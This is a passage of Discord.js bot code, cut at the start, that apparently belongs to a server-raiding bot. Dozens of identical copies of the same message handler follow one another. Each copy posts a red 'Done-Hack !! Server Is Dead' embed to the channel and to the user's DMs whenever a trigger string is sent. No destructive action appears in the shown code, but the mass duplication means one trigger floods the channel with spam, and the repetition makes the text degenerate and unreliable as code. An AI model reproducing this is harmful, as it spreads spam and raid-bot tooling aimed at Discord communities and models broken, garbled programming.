   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
